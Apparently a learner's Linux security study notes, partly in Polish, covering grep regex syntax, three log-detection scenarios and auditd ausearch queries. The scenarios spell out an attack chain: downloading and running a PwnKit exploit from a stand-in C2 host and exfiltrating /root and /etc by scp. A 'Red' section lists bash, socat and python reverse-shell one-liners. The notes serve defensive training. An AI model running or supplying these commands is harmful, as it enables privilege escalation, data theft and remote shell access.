#Overall
## Find
```
sudo find / -name ".env.local" -type f 2>/dev/null
```
## Grep
```
Extended Regular Expression
grep -E ''
\ (Wyjscie ze znaku specjalnego) omija znaki akcji.
| (Alternatywa): Szuka jednego lub drugiego wzorca.
Przykład: grep -E "Failed|Accepted" /var/log/auth.log (znajdzie próby logowania udane i nieudane).
+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
Przykład: grep -E "log+" (znajdzie "log", "logg", "loggg").
? (Zero lub jedno): Sprawia, że poprzedni znak jest opcjonalny.
Przykład: grep -E "https?" (znajdzie zarówno "http", jak i "https").
{n,m} (Kwantyfikatory): Pozwala określić dokładną liczbę powtórzeń.
Przykład: grep -E "[0-9]{1,3}" (szuka od jednej do trzech cyfr).
```
## Notatki
### Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

### Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

### Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data

# Red
## Reverse shell
```
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```

# Blue
```
ausearch -i -x socat # Look for suspicious commands
ausearch -i --pid 27806 # Find its parent process and build a process tree
ausearch -i --ppid 27808 | grep proctitle # List all its child processes
```
